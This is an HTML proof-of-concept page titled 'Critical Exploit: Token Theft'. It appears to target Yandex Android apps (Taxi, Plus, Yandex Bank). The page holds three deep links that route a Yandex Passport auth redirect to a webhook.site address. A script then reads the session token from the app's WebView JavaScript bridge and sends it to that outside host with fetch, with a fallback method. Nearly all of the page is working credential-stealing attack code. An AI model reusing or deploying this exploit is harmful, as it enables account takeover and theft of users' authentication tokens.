<!DOCTYPE html>
<html>
<body>
    <h2>Critical Exploit: Token Theft</h2>
    
    <a href="ru.yandex.taxi.passport://esia?url=https://passport.yandex.ru/auth/finish?retpath=https://webhook.site/da38e76f-4179-451b-9c4d-937c64f19e98">1. Attack via Esia (Wrapped)</a><br><br>

    <a href="plus://ru.yandex.taxi/sbp/redirect?url=https://passport.yandex.ru/auth/finish?retpath=https://webhook.site/da38e76f-4179-451b-9c4d-937c64f19e98">2. Attack via Plus SBP (Wrapped)</a><br><br>

    <a href="yandexbank://ru.yandex.taxi/finish-esia?url=https://webhook.site/da38e76f-4179-451b-9c4d-937c64f19e98">3. Attack via Yandex Bank</a><br><br>

    <script>
        // Скрипт сработает, если редирект внутри WebView доведет до твоего сайта
        window.onload = function() {
            try {
                var token = nativeAMAndroid.getToken();
                if(token) {
                    fetch("https://webhook.site/da38e76f-4179-451b-9c4d-937c64f19e98?stolen_token=" + token);
                    alert("Bingo! Token: " + token);
                }
            } catch(e) {
                // Если не получилось, попробуем альтернативное имя
                try {
                    var t2 = Yandex.getToken();
                    fetch("https://webhook.site/da38e76f-4179-451b-9c4d-937c64f19e98?stolen_token_alt=" + t2);
                } catch(err) {}
            }
        }
    </script>
</body>
</html>
